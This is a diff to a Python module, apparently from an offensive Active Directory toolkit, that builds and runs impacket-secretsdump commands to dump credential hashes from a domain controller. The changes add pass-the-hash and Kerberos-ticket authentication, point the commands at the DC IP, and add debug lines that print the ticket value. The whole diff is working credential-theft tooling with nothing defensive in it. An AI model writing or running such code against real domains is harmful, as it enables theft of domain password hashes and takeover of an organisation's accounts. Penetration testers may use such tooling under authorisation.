@@ -6,8 +6,9 @@ def run(data, cred, args):
     domain = data.get("domain")
     ip = data.get("ip")
     user = cred.get("user")
-    secret = cred.get("secret")
+    secret = cred.get("secret") or cred.get("ccache")
     cred_type = cred.get("type")
+    hostname = data.get("hostname")
 
     if not domain or not ip:
         print("[-] Missing domain or DC IP")
@@ -34,8 +35,10 @@ def run(data, cred, args):
         auth = f"{domain}/{user}:{secret}@{ip}"
     elif cred_type == "ntlm":
         auth = f"-hashes :{secret} {domain}/{user}@{ip}"
-    elif cred_type == "ccache":
-        auth = f"-k -no-pass {domain}/{user}@{ip}"
+    elif cred_type in ["ccache", "ticket"]:
+        print("TICKET!!!!")
+        print(secret)
+        auth = f"-k -no-pass {domain}/{user}@{hostname}.{domain}"
         env["KRB5CCNAME"] = secret
     else:
         return None
@@ -43,9 +46,9 @@ def run(data, cred, args):
     # --- CMD BUILD ---
     # If is_all is true, we remove the -just-dc-user filter
     if is_all:
-        cmd = f"impacket-secretsdump {auth}"
+        cmd = f"impacket-secretsdump -dc-ip {ip} {auth}"
     else:
-        cmd = f"impacket-secretsdump -just-dc-user {target_user} {auth}"
+        cmd = f"impacket-secretsdump -just-dc-user {target_user} -dc-ip {ip} {auth}"
 
     print(f"[*] Running: {cmd}\n")
 
